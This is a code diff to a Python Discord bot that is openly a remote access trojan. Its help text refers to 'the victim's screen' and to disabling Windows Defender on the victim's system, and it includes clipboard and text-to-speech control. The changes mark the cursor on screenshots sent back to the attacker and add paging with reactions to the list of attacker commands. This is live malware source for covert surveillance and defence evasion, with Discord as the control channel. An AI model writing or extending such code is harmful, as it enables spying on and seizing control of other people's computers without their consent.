@@ -1,6 +1,6 @@
 import discord
 from discord.ext import commands
-from PIL import ImageGrab
+from PIL import ImageGrab, ImageDraw
 import io
 import pyttsx3
 import pyaudio
@@ -111,12 +111,17 @@ async def set_clipboard(ctx, *, text: str):
     except Exception as e:
         await ctx.reply(f"Error executing command: {str(e)}")   
 
-@bot.command(help="Takes a screenshot of the victim's screen.")
+@bot.command(help="Takes a screenshot of the victim's screen including cursor location.")
 async def ss(ctx):
     img = ImageGrab.grab()
+    cursor_position = pyautogui.position()
+
+    draw = ImageDraw.Draw(img)
+    draw.ellipse((cursor_position[0]//2-5, cursor_position[1]//2-5, cursor_position[0]//2+5, cursor_position[1]//2+5), fill=(255, 0, 0))
+
     with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
         img.save(temp_file, 'PNG')
-        await ctx.reply("Command Executed!", file=discord.File(temp_file.name, filename="screenshot.png"))
+        await ctx.reply("Command Executed! (Red dot indicates cursor)", file=discord.File(temp_file.name, filename="screenshot.png"))
 
 tts_process = None
 
@@ -366,16 +371,11 @@ async def help(ctx, command_name: str):
     else:
         await ctx.reply(f"Command '{command_name}' not found.")
 
+per_page = 10
+
 @bot.command()
 async def commands(ctx, page: int = 1):
-    embed = discord.Embed(
-        title="Available Commands",
-        description="List of all commands",
-        color=0x007BFF
-    )
-
     commands_list = list(bot.commands)
-    per_page = 10
 
     max_page = (len(commands_list) - 1) // per_page + 1
 
@@ -387,6 +387,12 @@ async def commands(ctx, page: int = 1):
     end_index = start_index + per_page
     commands_on_page = commands_list[start_index:end_index]
 
+    embed = discord.Embed(
+        title="Available Commands",
+        description="List of all commands",
+        color=0x007BFF
+    )
+
     for command in commands_on_page:
         embed.add_field(
             name=command.name,
@@ -396,7 +402,43 @@ async def commands(ctx, page: int = 1):
 
     embed.set_footer(text=f"Page {page}/{max_page}")
 
-    await ctx.reply(embed=embed)
+    message = await ctx.reply(embed=embed)
+
+    if max_page > 1:
+        await message.add_reaction("◀️")
+        await message.add_reaction("▶️")
+
+    def check(reaction, user):
+        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id
+
+    while True:
+        try:
+            reaction, user = await bot.wait_for("reaction_add", timeout=60, check=check)
+            await message.remove_reaction(reaction, user)
+            
+            if str(reaction.emoji) == "◀️" and page > 1:
+                page -= 1
+            elif str(reaction.emoji) == "▶️" and page < max_page:
+                page += 1
+            
+            start_index = (page - 1) * per_page
+            end_index = start_index + per_page
+            commands_on_page = commands_list[start_index:end_index]
+
+            embed.clear_fields()
+            for command in commands_on_page:
+                embed.add_field(
+                    name=command.name,
+                    value=command.help if command.help else "No description provided",
+                    inline=False
+                )
+            
+            embed.set_footer(text=f"Page {page}/{max_page}")
+
+            await message.edit(embed=embed)
+
+        except asyncio.TimeoutError:
+            break
 
 @bot.command(help="Disables Windows Defender on the victim's system.")
 async def disabledefender(ctx):
